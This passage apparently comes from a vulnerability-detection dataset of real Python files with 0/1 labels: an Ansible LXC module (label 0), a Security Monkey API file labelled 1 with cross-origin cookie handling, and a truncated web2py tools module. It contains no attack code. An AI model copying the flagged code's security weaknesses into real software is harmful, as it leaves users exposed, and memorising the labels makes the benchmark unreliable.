method='frozen')\n        if self._container_exists(container_name=self.container_name):\n            self._execute_command()\n\n            # Perform any configuration updates\n            self._config()\n\n            container_state = self._get_state()\n            if container_state == 'frozen':\n                pass\n            elif container_state == 'running':\n                self.container.freeze()\n                self.state_change = True\n            else:\n                self._container_startup()\n                self.container.freeze()\n                self.state_change = True\n\n            # Check if the container needs to have an archive created.\n            self._check_archive()\n\n            # Check if the container is to be cloned\n            self._check_clone()\n        else:\n            self._create()\n            count += 1\n            self._frozen(count)\n\n    def _restarted(self, count=0):\n        \"\"\"Ensure a container is restarted.\n\n        If the container does not exist the container will be created.\n\n        :param count: number of times this command has been called by itself.\n        :type count: ``int``\n        \"\"\"\n\n        self.check_count(count=count, method='restart')\n        if self._container_exists(container_name=self.container_name):\n            self._execute_command()\n\n            # Perform any configuration updates\n            self._config()\n\n            if self._get_state() != 'stopped':\n                self.container.stop()\n                self.state_change = True\n\n            # Run container startup\n            self._container_startup()\n\n            # Check if the container needs to have an archive created.\n            self._check_archive()\n\n            # Check if the container is to be cloned\n            self._check_clone()\n        else:\n            self._create()\n            count += 1\n            self._restarted(count)\n\n    def _stopped(self, count=0):\n        \"\"\"Ensure a container is stopped.\n\n        If the container does not exist the container will be created.\n\n        :param count: number of times this command has been called by itself.\n        :type count: ``int``\n        \"\"\"\n\n        self.check_count(count=count, method='stop')\n        if self._container_exists(container_name=self.container_name):\n            self._execute_command()\n\n            # Perform any configuration updates\n            self._config()\n\n            if self._get_state() != 'stopped':\n                self.container.stop()\n                self.state_change = True\n\n            # Check if the container needs to have an archive created.\n            self._check_archive()\n\n            # Check if the container is to be cloned\n            self._check_clone()\n        else:\n            self._create()\n            count += 1\n            self._stopped(count)\n\n    def _started(self, count=0):\n        \"\"\"Ensure a container is started.\n\n        If the container does not exist the container will be created.\n\n        :param count: number of times this command has been called by itself.\n        :type count: ``int``\n        \"\"\"\n\n        self.check_count(count=count, method='start')\n        if self._container_exists(container_name=self.container_name):\n            container_state = self._get_state()\n            if container_state == 'running':\n                pass\n            elif container_state == 'frozen':\n                self._unfreeze()\n            elif not self._container_startup():\n                self.failure(\n                    lxc_container=self._container_data(),\n                    error='Failed to start container'\n                          ' [ %s ]' % self.container_name,\n                    rc=1,\n                    msg='The container [ %s ] failed to start. Check to lxc is'\n                        ' available and that the container is in a functional'\n                        ' state.' % self.container_name\n                )\n\n            # Return data\n            self._execute_command()\n\n            # Perform any configuration updates\n            self._config()\n\n            # Check if the container needs to have an archive created.\n            self._check_archive()\n\n            # Check if the container is to be cloned\n            self._check_clone()\n        else:\n            self._create()\n            count += 1\n            self._started(count)\n\n    def _get_lxc_vg(self):\n        \"\"\"Return the name of the Volume Group used in LXC.\"\"\"\n\n        build_command = [\n            self.module.get_bin_path('lxc-config', True),\n            \"lxc.bdev.lvm.vg\"\n        ]\n        rc, vg, err = self._run_command(build_command)\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='Failed to read LVM VG from LXC config',\n                command=' '.join(build_command)\n            )\n        else:\n            return str(vg.strip())\n\n    def _lvm_lv_list(self):\n        \"\"\"Return a list of all lv in a current vg.\"\"\"\n\n        vg = self._get_lxc_vg()\n        build_command = [\n            self.module.get_bin_path('lvs', True)\n        ]\n        rc, stdout, err = self._run_command(build_command)\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='Failed to get list of LVs',\n                command=' '.join(build_command)\n            )\n\n        all_lvms = [i.split() for i in stdout.splitlines()][1:]\n        return [lv_entry[0] for lv_entry in all_lvms if lv_entry[1] == vg]\n\n    def _get_vg_free_pe(self, vg_name):\n        \"\"\"Return the available size of a given VG.\n\n        :param vg_name: Name of volume.\n        :type vg_name: ``str``\n        :returns: size and measurement of an LV\n        :type: ``tuple``\n        \"\"\"\n\n        build_command = [\n            'vgdisplay',\n            vg_name,\n            '--units',\n            'g'\n        ]\n        rc, stdout, err = self._run_command(build_command)\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='failed to read vg %s' % vg_name,\n                command=' '.join(build_command)\n            )\n\n        vg_info = [i.strip() for i in stdout.splitlines()][1:]\n        free_pe = [i for i in vg_info if i.startswith('Free')]\n        _free_pe = free_pe[0].split()\n        return float(_free_pe[-2]), _free_pe[-1]\n\n    def _get_lv_size(self, lv_name):\n        \"\"\"Return the available size of a given LV.\n\n        :param lv_name: Name of volume.\n        :type lv_name: ``str``\n        :returns: size and measurement of an LV\n        :type: ``tuple``\n        \"\"\"\n\n        vg = self._get_lxc_vg()\n        lv = os.path.join(vg, lv_name)\n        build_command = [\n            'lvdisplay',\n            lv,\n            '--units',\n            'g'\n        ]\n        rc, stdout, err = self._run_command(build_command)\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='failed to read lv %s' % lv,\n                command=' '.join(build_command)\n            )\n\n        lv_info = [i.strip() for i in stdout.splitlines()][1:]\n        _free_pe = [i for i in lv_info if i.startswith('LV Size')]\n        free_pe = _free_pe[0].split()\n        return self._roundup(float(free_pe[-2])), free_pe[-1]\n\n    def _lvm_snapshot_create(self, source_lv, snapshot_name,\n                             snapshot_size_gb=5):\n        \"\"\"Create an LVM snapshot.\n\n        :param source_lv: Name of lv to snapshot\n        :type source_lv: ``str``\n        :param snapshot_name: Name of lv snapshot\n        :type snapshot_name: ``str``\n        :param snapshot_size_gb: Size of snapshot to create\n        :type snapshot_size_gb: ``int``\n        \"\"\"\n\n        vg = self._get_lxc_vg()\n        free_space, messurement = self._get_vg_free_pe(vg_name=vg)\n\n        if free_space < float(snapshot_size_gb):\n            message = (\n                'Snapshot size [ %s ] is > greater than [ %s ] on volume group'\n                ' [ %s ]' % (snapshot_size_gb, free_space, vg)\n            )\n            self.failure(\n                error='Not enough space to create snapshot',\n                rc=2,\n                msg=message\n            )\n\n        # Create LVM Snapshot\n        build_command = [\n            self.module.get_bin_path('lvcreate', True),\n            \"-n\",\n            snapshot_name,\n            \"-s\",\n            os.path.join(vg, source_lv),\n            \"-L%sg\" % snapshot_size_gb\n        ]\n        rc, stdout, err = self._run_command(build_command)\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='Failed to Create LVM snapshot %s/%s --> %s'\n                    % (vg, source_lv, snapshot_name)\n            )\n\n    def _lvm_lv_mount(self, lv_name, mount_point):\n        \"\"\"mount an lv.\n\n        :param lv_name: name of the logical volume to mount\n        :type lv_name: ``str``\n        :param mount_point: path on the file system that is mounted.\n        :type mount_point: ``str``\n        \"\"\"\n\n        vg = self._get_lxc_vg()\n\n        build_command = [\n            self.module.get_bin_path('mount', True),\n            \"/dev/%s/%s\" % (vg, lv_name),\n            mount_point,\n        ]\n        rc, stdout, err = self._run_command(build_command)\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='failed to mountlvm lv %s/%s to %s'\n                    % (vg, lv_name, mount_point)\n            )\n\n    def _create_tar(self, source_dir):\n        \"\"\"Create an archive of a given ``source_dir`` to ``output_path``.\n\n        :param source_dir:  Path to the directory to be archived.\n        :type source_dir: ``str``\n        \"\"\"\n\n        archive_path = self.module.params.get('archive_path')\n        if not os.path.isdir(archive_path):\n            os.makedirs(archive_path)\n\n        archive_compression = self.module.params.get('archive_compression')\n        compression_type = LXC_COMPRESSION_MAP[archive_compression]\n\n        # remove trailing / if present.\n        archive_name = '%s.%s' % (\n            os.path.join(\n                archive_path,\n                self.container_name\n            ),\n            compression_type['extension']\n        )\n\n        build_command = [\n            self.module.get_bin_path('tar', True),\n            '--directory=%s' % os.path.realpath(\n                os.path.expanduser(source_dir)\n            ),\n            compression_type['argument'],\n            archive_name,\n            '.'\n        ]\n\n        rc, stdout, err = self._run_command(\n            build_command=build_command,\n            unsafe_shell=True\n        )\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='failed to create tar archive',\n                command=' '.join(build_command)\n            )\n\n        return archive_name\n\n    def _lvm_lv_remove(self, lv_name):\n        \"\"\"Remove an LV.\n\n        :param lv_name: The name of the logical volume\n        :type lv_name: ``str``\n        \"\"\"\n\n        vg = self._get_lxc_vg()\n        build_command = [\n            self.module.get_bin_path('lvremove', True),\n            \"-f\",\n            \"%s/%s\" % (vg, lv_name),\n        ]\n        rc, stdout, err = self._run_command(build_command)\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='Failed to remove LVM LV %s/%s' % (vg, lv_name),\n                command=' '.join(build_command)\n            )\n\n    def _rsync_data(self, container_path, temp_dir):\n        \"\"\"Sync the container directory to the temp directory.\n\n        :param container_path: path to the container container\n        :type container_path: ``str``\n        :param temp_dir: path to the temporary local working directory\n        :type temp_dir: ``str``\n        \"\"\"\n        # This loop is created to support overlayfs archives. This should\n        # squash all of the layers into a single archive.\n        fs_paths = container_path.split(':')\n        if 'overlayfs' in fs_paths:\n            fs_paths.pop(fs_paths.index('overlayfs'))\n\n        for fs_path in fs_paths:\n            # Set the path to the container data\n            fs_path = os.path.dirname(fs_path)\n\n            # Run the sync command\n            build_command = [\n                self.module.get_bin_path('rsync', True),\n                '-aHAX',\n                fs_path,\n                temp_dir\n            ]\n            rc, stdout, err = self._run_command(\n                build_command,\n                unsafe_shell=True\n            )\n            if rc != 0:\n                self.failure(\n                    err=err,\n                    rc=rc,\n                    msg='failed to perform archive',\n                    command=' '.join(build_command)\n                )\n\n    def _unmount(self, mount_point):\n        \"\"\"Unmount a file system.\n\n        :param mount_point: path on the file system that is mounted.\n        :type mount_point: ``str``\n        \"\"\"\n\n        build_command = [\n            self.module.get_bin_path('umount', True),\n            mount_point,\n        ]\n        rc, stdout, err = self._run_command(build_command)\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='failed to unmount [ %s ]' % mount_point,\n                command=' '.join(build_command)\n            )\n\n    def _overlayfs_mount(self, lowerdir, upperdir, mount_point):\n        \"\"\"mount an lv.\n\n        :param lowerdir: name/path of the lower directory\n        :type lowerdir: ``str``\n        :param upperdir: name/path of the upper directory\n        :type upperdir: ``str``\n        :param mount_point: path on the file system that is mounted.\n        :type mount_point: ``str``\n        \"\"\"\n\n        build_command = [\n            self.module.get_bin_path('mount', True),\n            '-t overlayfs',\n            '-o lowerdir=%s,upperdir=%s' % (lowerdir, upperdir),\n            'overlayfs',\n            mount_point,\n        ]\n        rc, stdout, err = self._run_command(build_command)\n        if rc != 0:\n            self.failure(\n                err=err,\n                rc=rc,\n                msg='failed to mount overlayfs:%s:%s to %s -- Command: %s'\n                    % (lowerdir, upperdir, mount_point, build_command)\n            )\n\n    def _container_create_tar(self):\n        \"\"\"Create a tar archive from an LXC container.\n\n        The process is as follows:\n            * Stop or Freeze the container\n            * Create temporary dir\n            * Copy container and config to temporary directory\n            * If LVM backed:\n                * Create LVM snapshot of LV backing the container\n                * Mount the snapshot to tmpdir/rootfs\n            * Restore the state of the container\n            * Create tar of tmpdir\n            * Clean up\n        \"\"\"\n\n        # Create a temp dir\n        temp_dir = tempfile.mkdtemp()\n\n        # Set the name of the working dir, temp + container_name\n        work_dir = os.path.join(temp_dir, self.container_name)\n\n        # LXC container rootfs\n        lxc_rootfs = self.container.get_config_item('lxc.rootfs')\n\n        # Test if the containers rootfs is a block device\n        block_backed = lxc_rootfs.startswith(os.path.join(os.sep, 'dev'))\n\n        # Test if the container is using overlayfs\n        overlayfs_backed = lxc_rootfs.startswith('overlayfs')\n\n        mount_point = os.path.join(work_dir, 'rootfs')\n\n        # Set the snapshot name if needed\n        snapshot_name = '%s_lxc_snapshot' % self.container_name\n\n        container_state = self._get_state()\n        try:\n            # Ensure the original container is stopped or frozen\n            if container_state not in ['stopped', 'frozen']:\n                if container_state == 'running':\n                    self.container.freeze()\n                else:\n                    self.container.stop()\n\n            # Sync the container data from the container_path to work_dir\n            self._rsync_data(lxc_rootfs, temp_dir)\n\n            if block_backed:\n                if snapshot_name not in self._lvm_lv_list():\n                    if not os.path.exists(mount_point):\n                        os.makedirs(mount_point)\n\n                    # Take snapshot\n                    size, measurement = self._get_lv_size(\n                        lv_name=self.container_name\n                    )\n                    self._lvm_snapshot_create(\n                        source_lv=self.container_name,\n                        snapshot_name=snapshot_name,\n                        snapshot_size_gb=size\n                    )\n\n                    # Mount snapshot\n                    self._lvm_lv_mount(\n                        lv_name=snapshot_name,\n                        mount_point=mount_point\n                    )\n                else:\n                    self.failure(\n                        err='snapshot [ %s ] already exists' % snapshot_name,\n                        rc=1,\n                        msg='The snapshot [ %s ] already exists. Please clean'\n                            ' up old snapshot of containers before continuing.'\n                            % snapshot_name\n                    )\n            elif overlayfs_backed:\n                lowerdir, upperdir = lxc_rootfs.split(':')[1:]\n                self._overlayfs_mount(\n                    lowerdir=lowerdir,\n                    upperdir=upperdir,\n                    mount_point=mount_point\n                )\n\n            # Set the state as changed and set a new fact\n            self.state_change = True\n            return self._create_tar(source_dir=work_dir)\n        finally:\n            if block_backed or overlayfs_backed:\n                # unmount snapshot\n                self._unmount(mount_point)\n\n            if block_backed:\n                # Remove snapshot\n                self._lvm_lv_remove(snapshot_name)\n\n            # Restore original state of container\n            if container_state == 'running':\n                if self._get_state() == 'frozen':\n                    self.container.unfreeze()\n                else:\n                    self.container.start()\n\n            # Remove tmpdir\n            shutil.rmtree(temp_dir)\n\n    def check_count(self, count, method):\n        if count > 1:\n            self.failure(\n                error='Failed to %s container' % method,\n                rc=1,\n                msg='The container [ %s ] failed to %s. Check to lxc is'\n                    ' available and that the container is in a functional'\n                    ' state.' % (self.container_name, method)\n            )\n\n    def failure(self, **kwargs):\n        \"\"\"Return a Failure when running an Ansible command.\n\n        :param error: ``str``  Error that occurred.\n        :param rc: ``int``     Return code while executing an Ansible command.\n        :param msg: ``str``    Message to report.\n        \"\"\"\n\n        self.module.fail_json(**kwargs)\n\n    def run(self):\n        \"\"\"Run the main method.\"\"\"\n\n        action = getattr(self, LXC_ANSIBLE_STATES[self.state])\n        action()\n\n        outcome = self._container_data()\n        if self.archive_info:\n            outcome.update(self.archive_info)\n\n        if self.clone_info:\n            outcome.update(self.clone_info)\n\n        self.module.exit_json(\n            changed=self.state_change,\n            lxc_container=outcome\n        )\n\n\ndef main():\n    \"\"\"Ansible Main module.\"\"\"\n\n    module = AnsibleModule(\n        argument_spec=dict(\n            name=dict(\n                type='str',\n                required=True\n            ),\n            template=dict(\n                type='str',\n                default='ubuntu'\n            ),\n            backing_store=dict(\n                type='str',\n                choices=LXC_BACKING_STORE.keys(),\n                default='dir'\n            ),\n            template_options=dict(\n                type='str'\n            ),\n            config=dict(\n                type='str',\n            ),\n            vg_name=dict(\n                type='str',\n                default='lxc'\n            ),\n            thinpool=dict(\n                type='str'\n            ),\n            fs_type=dict(\n                type='str',\n                default='ext4'\n            ),\n            fs_size=dict(\n                type='str',\n                default='5G'\n            ),\n            directory=dict(\n                type='str'\n            ),\n            zfs_root=dict(\n                type='str'\n            ),\n            lv_name=dict(\n                type='str'\n            ),\n            lxc_path=dict(\n                type='str'\n            ),\n            state=dict(\n                choices=LXC_ANSIBLE_STATES.keys(),\n                default='started'\n            ),\n            container_command=dict(\n                type='str'\n            ),\n            container_config=dict(\n                type='str'\n            ),\n            container_log=dict(\n                type='bool',\n                default='false'\n            ),\n            container_log_level=dict(\n                choices=[n for i in LXC_LOGGING_LEVELS.values() for n in i],\n                default='INFO'\n            ),\n            clone_name=dict(\n                type='str',\n                required=False\n            ),\n            clone_snapshot=dict(\n                type='bool',\n                default='false'\n            ),\n            archive=dict(\n                type='bool',\n                default='false'\n            ),\n            archive_path=dict(\n                type='str',\n            ),\n            archive_compression=dict(\n                choices=LXC_COMPRESSION_MAP.keys(),\n                default='gzip'\n            )\n        ),\n        supports_check_mode=False,\n        required_if = ([\n            ('archive', True, ['archive_path'])\n        ]),\n    )\n\n    if not HAS_LXC:\n        module.fail_json(\n            msg='The `lxc` module is not importable. Check the requirements.'\n        )\n\n    lv_name = module.params.get('lv_name')\n    if not lv_name:\n        module.params['lv_name'] = module.params.get('name')\n\n    lxc_manage = LxcContainerManagement(module=module)\n    lxc_manage.run()\n\n\n# import module bits\nfrom ansible.module_utils.basic import *\nmain()\n", "target": 0}
{"idx": 1071, "func": "#     Copyright 2014 Netflix, Inc.\n#\n#     Licensed under the Apache License, Version 2.0 (the \"License\");\n#     you may not use this file except in compliance with the License.\n#     You may obtain a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#     Unless required by applicable law or agreed to in writing, software\n#     distributed under the License is distributed on an \"AS IS\" BASIS,\n#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n#     See the License for the specific language governing permissions and\n#     limitations under the License.\n\nfrom security_monkey import app, db\nfrom flask_wtf.csrf import generate_csrf\nfrom security_monkey.auth.models import RBACRole\nfrom security_monkey.decorators import crossdomain\n\nfrom flask_restful import fields, marshal, Resource, reqparse\nfrom flask_login import current_user\n\nORIGINS = [\n    'https://{}:{}'.format(app.config.get('FQDN'), app.config.get('WEB_PORT')),\n    # Adding this next one so you can also access the dart UI by prepending /static to the path.\n    'https://{}:{}'.format(app.config.get('FQDN'), app.config.get('API_PORT')),\n    'https://{}:{}'.format(app.config.get('FQDN'), app.config.get('NGINX_PORT')),\n    'https://{}:80'.format(app.config.get('FQDN'))\n]\n\n##### Marshal Datastructures #####\n\n# Used by RevisionGet, RevisionList, ItemList\nREVISION_FIELDS = {\n    'id': fields.Integer,\n    'date_created': fields.String,\n    'date_last_ephemeral_change': fields.String,\n    'active': fields.Boolean,\n    'item_id': fields.Integer\n}\n\n# Used by RevisionList, ItemGet, ItemList\nITEM_FIELDS = {\n    'id': fields.Integer,\n    'region': fields.String,\n    'name': fields.String\n}\n\n# Used by ItemList, Justify\nAUDIT_FIELDS = {\n    'id': fields.Integer,\n    'score': fields.Integer,\n    'issue': fields.String,\n    'notes': fields.String,\n    'justified': fields.Boolean,\n    'justification': fields.String,\n    'justified_date': fields.String,\n    'item_id': fields.Integer\n}\n\n## Single Use Marshal Objects ##\n\n# SINGLE USE - RevisionGet\nREVISION_COMMENT_FIELDS = {\n    'id': fields.Integer,\n    'revision_id': fields.Integer,\n    'date_created': fields.String,\n    'text': fields.String\n}\n\n# SINGLE USE - ItemGet\nITEM_COMMENT_FIELDS = {\n    'id': fields.Integer,\n    'date_created': fields.String,\n    'text': fields.String,\n    'item_id': fields.Integer\n}\n\n# SINGLE USE - UserSettings\nUSER_SETTINGS_FIELDS = {\n    # 'id': fields.Integer,\n    'daily_audit_email': fields.Boolean,\n    'change_reports': fields.String\n}\n\n# SINGLE USE - AccountGet\nACCOUNT_FIELDS = {\n    'id': fields.Integer,\n    'name': fields.String,\n    'identifier': fields.String,\n    'notes': fields.String,\n    'active': fields.Boolean,\n    'third_party': fields.Boolean,\n    'account_type': fields.String\n}\n\nUSER_FIELDS = {\n    'id': fields.Integer,\n    'active': fields.Boolean,\n    'email': fields.String,\n    'role': fields.String,\n    'confirmed_at': fields.String,\n    'daily_audit_email': fields.Boolean,\n    'change_reports': fields.String,\n    'last_login_at': fields.String,\n    'current_login_at': fields.String,\n    'login_count': fields.Integer,\n    'last_login_ip': fields.String,\n    'current_login_ip': fields.String\n}\n\nROLE_FIELDS = {\n    'id': fields.Integer,\n    'name': fields.String,\n    'description': fields.String,\n}\n\nWHITELIST_FIELDS = {\n    'id': fields.Integer,\n    'name': fields.String,\n    'notes': fields.String,\n    'cidr': fields.String\n}\n\nIGNORELIST_FIELDS = {\n    'id': fields.Integer,\n    'prefix': fields.String,\n    'notes': fields.String,\n}\n\nAUDITORSETTING_FIELDS = {\n    'id': fields.Integer,\n    'disabled': fields.Boolean,\n    'issue_text': fields.String\n}\n\nITEM_LINK_FIELDS = {\n    'id': fields.Integer,\n    'name': fields.String\n}\n\nclass AuthenticatedService(Resource):\n    def __init__(self):\n        self.reqparse = reqparse.RequestParser()\n        super(AuthenticatedService, self).__init__()\n        self.auth_dict = dict()\n        if current_user.is_authenticated():\n            roles_marshal = []\n            for role in current_user.roles:\n                roles_marshal.append(marshal(role.__dict__, ROLE_FIELDS))\n\n            roles_marshal.append({\"name\": current_user.role})\n\n            for role in RBACRole.roles[current_user.role].get_parents():\n                roles_marshal.append({\"name\": role.name})\n\n            self.auth_dict = {\n                \"authenticated\": True,\n                \"user\": current_user.email,\n                \"roles\": roles_marshal\n            }\n        else:\n            if app.config.get('FRONTED_BY_NGINX'):\n                url = \"https://{}:{}{}\".format(app.config.get('FQDN'), app.config.get('NGINX_PORT'), '/login')\n            else:\n                url = \"http://{}:{}{}\".format(app.config.get('FQDN'), app.config.get('API_PORT'), '/login')\n            self.auth_dict = {\n                \"authenticated\": False,\n                \"user\": None,\n                \"url\": url\n            }\n\n\n@app.after_request\n@crossdomain(allowed_origins=ORIGINS)\ndef after(response):\n    response.set_cookie('XSRF-COOKIE', generate_csrf())\n    return response\n", "target": 1}
{"idx": 1072, "func": "#!/bin/python\n# -*- coding: utf-8 -*-\n\n\"\"\"\n| This file is part of the web2py Web Framework\n| Copyrighted by Massimo Di Pierro <mdipierro@cs.depaul.edu>\n| License: LGPLv3 (http://www.gnu.org/licenses/lgpl.html)\n\nAuth, Mail, PluginManager and various utilities\n------------------------------------------------\n\"\"\"\n\nimport base64\ntry:\n    import cPickle as pickle\nexcept:\n    import pickle\nimport datetime\nimport thread\nimport logging\nimport sys\nimport glob\nimport os\nimport re\nimport time\nimport traceback\nimport smtplib\nimport urllib\nimport urllib2\nimport Cookie\nimport cStringIO\nimport ConfigParser\nimport email.utils\nimport random\nfrom email import MIMEBase, MIMEMultipart, MIMEText, Encoders, Header, message_from_string, Charset\n\nfrom gluon.contenttype import contenttype\nfrom gluon.storage import Storage, StorageList, Settings, Messages\nfrom gluon.utils import web2py_uuid\nfrom gluon.fileutils import read_file, check_credentials\nfrom gluon import *\nfrom gluon.contrib.autolinks import expand_one\nfrom gluon.contrib.markmin.markmin2html import \\\n    replace_at_urls, replace_autolinks, replace_components\nfrom pydal.objects import Row, Set, Query\n\nimport gluon.serializers as serializers\n\nTable = DAL.Table\nField = DAL.Field\n\ntry:\n    # try stdlib (Python 2.6)\n    import json as json_parser\nexcept ImportError:\n    try:\n        # try external module\n        import simplejson as json_parser\n    except:\n        # fallback to pure-Python module\n        import gluon.contrib.simplejson as json_parser\n\n__all__ = ['Mail', 'Auth', 'Recaptcha', 'Recaptcha2', 'Crud', 'Service', 'Wiki',\n           'PluginManager', 'fetch', 'geocode', 'reverse_geocode', 'prettydate']\n\n### mind there are two loggers here (logger and crud.settings.logger)!\nlogger = logging.getLogger(\"web2py\")\n\nDEFAULT = lambda: None\n\n\ndef getarg(position, default=None):\n    args = current.request.args\n    if position < 0 and len(args) >= -position:\n        return args[position]\n    elif position >= 0 and len(args) > position:\n        return args[position]\n    else:\n        return default\n\n\ndef callback(actions, form, tablename=None):\n    if actions:\n        if tablename and isinstance(actions, dict):\n            actions = actions.get(tablename, [])\n        if not isinstance(actions, (list, tuple)):\n            actions = [actions]\n        [action(form) for action in actions]\n\n\ndef validators(*a):\n    b = []\n    for item in a:\n        if isinstance(item, (list, tuple)):\n            b = b + list(item)\n        else:\n            b.append(item)\n    return b\n\n\ndef call_or_redirect(f, *args):\n    if callable(f):\n        redirect(f(*args))\n    else:\n        redirect(f)\n\n\ndef replace_id(url, form):\n    if url:\n        url = url.replace('[id]', str(form.vars.id))\n        if url[0] == '/' or url[:4] == 'http':\n            return url\n    return URL(url)\n\n\nclass Mail(object):\n    \"\"\"\n    Class for configuring and sending emails with alternative text / html\n    body, multiple attachments and encryption support\n\n    Works with SMTP and Google App Engine.\n\n    Args:\n        server: SMTP server address in address:port notation\n        sender: sender email address\n        login: sender login name and password in login:password notation\n            or None if no authentication is required\n        tls: enables/disables encryption (True by default)\n\n    In Google App Engine use ::\n\n        server='gae'\n\n    For sake of backward compatibility all fields are optional and default\n    to None, however, to be able to send emails at least server and sender\n    must be specified. They are available under following fields::\n\n        mail.settings.server\n        mail.settings.sender\n        mail.settings.login\n        mail.settings.timeout = 60 # seconds (default)\n\n    When server is 'logging', email is logged but not sent (debug mode)\n\n    Optionally you can use PGP encryption or X509::\n\n        mail.settings.cipher_type = None\n        mail.settings.gpg_home = None\n        mail.settings.sign = True\n        mail.settings.sign_passphrase = None\n        mail.settings.encrypt = True\n        mail.settings.x509_sign_keyfile = None\n        mail.settings.x509_sign_certfile = None\n        mail.settings.x509_sign_chainfile = None\n        mail.settings.x509_nocerts = False\n        mail.settings.x509_crypt_certfiles = None\n\n        cipher_type       : None\n                            gpg - need a python-pyme package and gpgme lib\n                            x509 - smime\n        gpg_home          : you can set a GNUPGHOME environment variable\n                            to specify home of gnupg\n        sign              : sign the message (True or False)\n        sign_passphrase   : passphrase for key signing\n        encrypt           : encrypt the message (True or False). It defaults\n                            to True\n                         ... x509 only ...\n        x509_sign_keyfile : the signers private key filename or\n                            string containing the key. (PEM format)\n        x509_sign_certfile: the signers certificate filename or\n                            string containing the cert. (PEM format)\n        x509_sign_chainfile: sets the optional all-in-one file where you\n                             can assemble the certificates of Certification\n                             Authorities (CA) which form the certificate\n                             chain of email certificate. It can be a\n                             string containing the certs to. (PEM format)\n        x509_nocerts      : if True then no attached certificate in mail\n        x509_crypt_certfiles: the certificates file or strings to encrypt\n                              the messages with can be a file name /\n                              string or a list of file names /\n                              strings (PEM format)\n\n    Examples:\n        Create Mail object with authentication data for remote server::\n\n            mail = Mail('example.com:25', 'me@example.com', 'me:password')\n\n    Notice for GAE users:\n        attachments have an automatic content_id='attachment-i' where i is progressive number\n        in this way the can be referenced from the HTML as <img src=\"cid:attachment-0\" /> etc.\n    \"\"\"\n\n    class Attachment(MIMEBase.MIMEBase):\n        \"\"\"\n        Email attachment\n\n        Args:\n            payload: path to file or file-like object with read() method\n            filename: name of the attachment stored in message; if set to\n                None, it will be fetched from payload path; file-like\n                object payload must have explicit filename specified\n            content_id: id of the attachment; automatically contained within\n                `<` and `>`\n            content_type: content type of the attachment; if set to None,\n                it will be fetched from filename using gluon.contenttype\n                module\n            encoding: encoding of all strings passed to this function (except\n                attachment body)\n\n        Content ID is used to identify attachments within the html body;\n        in example, attached image with content ID 'photo' may be used in\n        html message as a source of img tag `<img src=\"cid:photo\" />`.\n\n        Example::\n            Create attachment from text file::\n\n                attachment = Mail.Attachment('/path/to/file.txt')\n\n                Content-Type: text/plain\n                MIME-Version: 1.0\n                Content-Disposition: attachment; filename=\"file.txt\"\n                Content-Transfer-Encoding: base64\n\n                SOMEBASE64CONTENT=\n\n            Create attachment from image file with custom filename and cid::\n\n                attachment = Mail.Attachment('/path/to/file.png',\n                                                 filename='photo.png',\n                                                 content_id='photo')\n\n                Content-Type: image/png\n                MIME-Version: 1.0\n                Content-Disposition: attachment; filename=\"photo.png\"\n                Content-Id: <photo>\n                Content-Transfer-Encoding: base64\n\n                SOMEOTHERBASE64CONTENT=\n        \"\"\"\n\n        def __init__(\n            self,\n            payload,\n            filename=None,\n            content_id=None,\n            content_type=None,\n                encoding='utf-8'):\n            if isinstance(payload, str):\n                if filename is None:\n                    filename = os.path.basename(payload)\n                payload = read_file(payload, 'rb')\n            else:\n                if filename is None:\n                    raise Exception('Missing attachment name')\n                payload = payload.read()\n            filename = filename.encode(encoding)\n            if content_type is None:\n                content_type = contenttype(filename)\n            self.my_filename = filename\n            self.my_payload = payload\n            MIMEBase.MIMEBase.__init__(self, *content_type.split('/', 1))\n            self.set_payload(payload)\n            self['Content-Disposition'] = 'attachment; filename=\"%s\"' % filename\n            if not content_id is None:\n                self['Content-Id'] = '<%s>' % content_id.encode(encoding)\n            Encoders.encode_base64(self)\n\n    def __init__(self, server=None, sender=None, login=None, tls=True):\n\n        settings = self.settings = Settings()\n        settings.server = server\n        settings.sender = sender\n        settings.login = login\n        settings.tls = tls\n        settings.timeout = 60 # seconds\n        settings.hostname = None\n        settings.ssl = False\n        settings.cipher_type = None\n        settings.gpg_home = None\n        settings.sign = True\n        settings.sign_passphrase = None\n        settings.encrypt = True\n        settings.x509_sign_keyfile = None\n        settings.x509_sign_certfile = None\n        settings.x509_sign_chainfile = None\n        settings.x509_nocerts = False\n        settings.x509_crypt_certfiles = None\n        settings.debug = False\n        settings.lock_keys = True\n        self.result = {}\n        self.error = None\n\n    def send(self,\n             to,\n             subject='[no subject]',\n             message='[no message]',\n             attachments=None,\n             cc=None,\n             bcc=None,\n             reply_to=None,\n             sender=None,\n             encoding='utf-8',\n             raw=False,\n             headers={},\n             from_address=None,\n             cipher_type=None,\n             sign=None,\n             sign_passphrase=None,\n             encrypt=None,\n             x509_sign_keyfile=None,\n             x509_sign_chainfile=None,\n             x509_sign_certfile=None,\n             x509_crypt_certfiles=None,\n             x509_nocerts=None\n             ):\n        \"\"\"\n        Sends an email using data specified in constructor\n\n        Args:\n            to: list or tuple of receiver addresses; will also accept single\n                object\n            subject: subject of the email\n            message: email body text; depends on type of passed object:\n\n                - if 2-list or 2-tuple is passed: first element will be\n                  source of plain text while second of html text;\n                - otherwise: object will be the only source of plain text\n                  and html source will be set to None\n\n                If text or html source is:\n\n                - None: content part will be ignored,\n                - string: content part will be set to it,\n                - file-like object: content part will be fetched from it using\n                  it's read() method\n            attachments: list or tuple of Mail.Attachment objects; will also\n                accept single object\n            cc: list or tuple of carbon copy receiver addresses; will also\n                accept single object\n            bcc: list or tuple of blind carbon copy receiver addresses; will\n                also accept single object\n            reply_to: address to which reply should be composed\n            encoding: encoding of all strings passed to this method (including\n                message bodies)\n            headers: dictionary of headers to refine the headers just before\n                sending mail, e.g. `{'X-Mailer' : 'web2py mailer'}`\n            from_address: address to appear in the 'From:' header, this is not\n                the envelope sender. If not specified the sender will be used\n\n            cipher_type :\n                gpg - need a python-pyme package and gpgme lib\n                